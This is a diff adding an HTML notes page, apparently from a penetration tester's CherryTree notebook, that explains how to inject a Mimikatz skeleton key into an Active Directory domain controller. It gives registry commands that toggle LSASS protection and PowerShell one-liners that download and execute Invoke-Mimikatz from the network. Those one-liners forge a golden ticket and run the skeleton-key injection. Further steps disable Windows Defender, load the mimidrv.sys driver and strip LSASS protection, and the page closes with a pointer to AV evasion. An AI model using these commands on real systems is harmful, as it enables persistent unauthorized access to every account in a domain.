@@ -1,0 +1,75 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Inject a Skeleton Key</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Inject a Skeleton Key</h1><br /><br /><strong>LSASS protected process</strong><br />From Windows
+    Server 2012 R2 and Windows 8.1 lsass.exe can be made a <span style="text-decoration:underline;">protected
+      process</span>, and hashes are no longer stored in memory.<br />To <span
+      style="color:#1ce579;">enable</span>/<span style="color:#ff0000;">disable</span> LSASS protection(to take effect
+    the DC need to restart), on command line:<br /> ◇ <span style="color:#1ce579;">enable</span> LSASS protection<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;reg&nbsp;query&nbsp;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&nbsp;/v&nbsp;RunAsPPL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#query&nbsp;for&nbsp;the&nbsp;value&nbsp;of&nbsp;RunAsPPL<br />PS&gt;&nbsp;reg&nbsp;add&nbsp;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&nbsp;/v&nbsp;RunAsPPL&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;1&nbsp;/f&nbsp;&nbsp;#enable&nbsp;LSA&nbsp;protection&nbsp;on&nbsp;the&nbsp;machine
+      </div>
+    </div><br /> check it with <a
+      href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Sysinternals Process
+      Explorer</a><br /> <a href=""><img src="images/1156-1.png" alt="images/1156-1.png" /></a><br /> ◇ <span
+      style="color:#ff0000;">disable</span> LSASS protection<br />
+    <div class="codebox">
+      <div class="codebox">
+        C:\&gt;&nbsp;reg&nbsp;add&nbsp;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&nbsp;/v&nbsp;RunAsPPL&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;0&nbsp;/f&nbsp;&nbsp;#disable&nbsp;LSA&nbsp;protection&nbsp;on&nbsp;the&nbsp;machine
+      </div>
+    </div><br /> check it with <a
+      href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Sysinternals Process
+      Explorer</a><br /> <a href=""><img src="images/1156-2.png" alt="images/1156-2.png" /></a><br /><br /> <br />•
+    LSASS protection <span style="color:#ff0000;">disabled</span>(or before Windows Server 2012 R2 and Windows
+    8.1):<br /> 0. Once we have Domain Admin rights for example thannks to a <a
+      href="ploitation--Privilege_Escalation--Active_Directory(Windows)_Privilege_Escalation--Windows_Authentication_attacks--Kerberos--Golden_Ticket.html">Golden
+      Ticket</a><br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;);Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/user:Administrator&nbsp;/domain:DANIELE.local&nbsp;/sid:S-1-5-21-2492168702-2322743348-3414347950&nbsp;/krbtgt:fde97d36054bc731495f5d88f458a7ce&nbsp;&nbsp;/id:500&nbsp;/groups:512&nbsp;/startoffset:0&nbsp;/endin:600&nbsp;/renewmax:10080&nbsp;/ptt&quot;&#39;
+      </div>
+    </div><br /> 1. Inject a Skeleton Key in the <span style="color:#ff8700;">Domain Controller</span>. The Skeleton Key
+    would be “mimikatz” <br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;);Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;privilege::debug&quot;&nbsp;&quot;misc::skeleton&quot;&#39;&nbsp;-ComputerName&nbsp;&lt;hostnameDC&gt;.<span
+          style="color:#000000;font-weight:400">&lt;</span>FQDN<span style="color:#000000;font-weight:400">&gt;</span>
+      </div>
+    </div><br /> <a href=""><img src="images/1156-3.png" alt="images/1156-3.png" /></a><br />• LSASS protection <span
+      style="color:#1ce579;">enabled</span>(from Windows Server 2012 R2): <br /> 0. To verify that it is ebabled <br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;reg&nbsp;query&nbsp;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&nbsp;/v&nbsp;RunAsPPL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#the&nbsp;value&nbsp;is&nbsp;0x1(hexadecimal&nbsp;of&nbsp;1<br />mimikatz#&nbsp;sekurlsa::logonPasswords&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#we&nbsp;will&nbsp;get&nbsp;a&nbsp;handling&nbsp;error&nbsp;memory
+      </div>
+    </div><br /> <a href=""><img src="images/1156-4.png" alt="images/1156-4.png" /></a> <br /> 1. To bypass this
+    restriction we need to load the mimikatz driver “mimidrv.sys” from the current working directory of mimikatz<br />
+    This mean also we cannot use the the Invoke-Mimikatz.ps1 script.<br /> From mimikatz on the <span
+      style="color:#ff8700;">DC</span>:<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;Set-MpPreference&nbsp;-DisableRealtimeMonitoring&nbsp;$true&nbsp;&nbsp;&nbsp;#Disable&nbsp;Windows&nbsp;Defender(from&nbsp;Windows&nbsp;Server&nbsp;2016)<br />PS&gt;&nbsp;\mimikatz.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#run&nbsp;mimikatz&nbsp;as&nbsp;Administrator<br />mimikatz#&nbsp;privilege::debug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br />mimikatz#&nbsp;!+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#load&nbsp;the&nbsp;driver&nbsp;mimidrv.sys<br />mimikatz#&nbsp;!processprotect&nbsp;/process:lsass.exe&nbsp;/remove&nbsp;&nbsp;&nbsp;&nbsp;#Remove&nbsp;Protection<br />mimikatz#&nbsp;misc::skeleton<br />mimikatz#&nbsp;!-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#remove&nbsp;the&nbsp;driver&nbsp;mimidrv.sys
+      </div>
+    </div><br /> <a href=""><img src="images/1156-5.png" alt="images/1156-5.png" /></a><br /> To understand how the
+    mimdrv.sys driver work see the article of <a href="https://twitter.com/matterpreter" target="_blank" target="_blank">@matterpreter</a><br /> Note
+    anyway that the <span style="text-decoration:underline;">command above will be very noisy in logs</span>, because of
+    Service Installation(Kernel mode driver). Moreover because of the hash and composition of the file is known for the
+    last 7 years. Even the least competent AV will probably detect it.<br /> For AV evasion there is a great post of <a
+      href="https://medium.com/@gorkemkaradeniz/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5">@gorkemkaradeniz</a>
+    <br /> <br /> <br /><br />Bibliography:<br />• GitHub Invoke-Mimikatz.ps1: <a
+      href="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank">https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1</a><br />•
+    <a href="https://www.scip.ch/en/?labs.20200116" target="_blank">https://www.scip.ch/en/?labs.20200116</a><br />• <a
+      href="https://support.authlogics.com/hc/en-us/articles/360012317780-PPA-does-not-function-when-Windows-Local-Security-Authority-LSA-Protection-is-enabled?mobile_site=true" target="_blank">https://support.authlogics.com/hc/en-us/articles/360012317780-PPA-does-not-function-when-Windows-Local-Security-Authority-LSA-Protection-is-enabled?mobile_site=true</a>
+  </div>
+</body>
+
+</html>
